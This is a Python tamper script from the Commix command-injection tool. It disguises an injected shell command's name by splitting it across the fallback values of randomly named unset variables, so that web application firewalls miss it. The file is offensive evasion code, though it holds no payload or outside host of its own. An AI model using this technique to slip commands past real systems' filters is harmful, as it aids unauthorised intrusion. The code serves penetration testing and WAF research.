#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import random
import re
import string
from src.utils import settings
from src.core.controller import checks

"""
About: Splits the name of the user-supplied operating system command across unset shell variables.
Notes: This tamper script works against target(s) with a POSIX shell.
References: [1] https://www.secjuice.com/web-application-firewall-waf-evasion/
"""

__tamper__ = "cmd2var"
__priority__ = settings.PRIORITY.HIGHER

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_unix_only(__tamper__)

# Named once for the whole run, and long enough that the target is unlikely to have them set.
VARIABLE_NAME_LENGTH = 3

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# A name of its own, so that what the shell falls back on is the piece carried in the payload.
def _variable_name():
  return "".join(random.choice(string.ascii_uppercase) for _ in range(VARIABLE_NAME_LENGTH))

def _split_name(name):
  """
  The command's name carried as the fallbacks of two variables the target has not set.

  Where a script that writes between the characters leaves them in order - so stripping what was
  written between them hands the name straight back - this leaves no piece of the name outside an
  expansion, and needs no command of its own to do it.
  """
  at = random.randint(1, len(name) - 1)
  return "${" + _variable_name() + ":-" + name[:at] + "}${" + _variable_name() + ":-" + name[at:] + "}"

# A name already carrying a glob is left whole - splitting it would cut a bracket in two.
GLOBBED_NAME = r"[*?\[\]]"

# The command with its name carried in pieces, for the target's shell to put back together.
def rewrite_command(command):
  name = command.split(settings.SINGLE_WHITESPACE)[0]
  # A name of one character cannot be split, a keyword stops being one once it is written any
  # other way, and a glob has already hidden the name it was made from.
  if len(name) < 2 or checks.tamper_word_kept(name) or re.search(GLOBBED_NAME, name):
    warn_msg = "The '" + __tamper__ + ".py' tamper script cannot split the name of the '"
    warn_msg += command + "' command. Skipping tamper script."
    settings.print_once(warn_msg)
    return command
  return _split_name(name) + command[len(name):]

# Hand the command's name over in pieces, alongside whatever else rewrites the command.
def tamper(payload):
  # The exploitation phase reaches here before there is a command of the user's own to rewrite.
  if settings.EXPLOITATION_PHASE and settings.USER_APPLIED_CMD:
    return checks.tamper_rewrite_user_command(payload, __tamper__)
  return payload

# eof
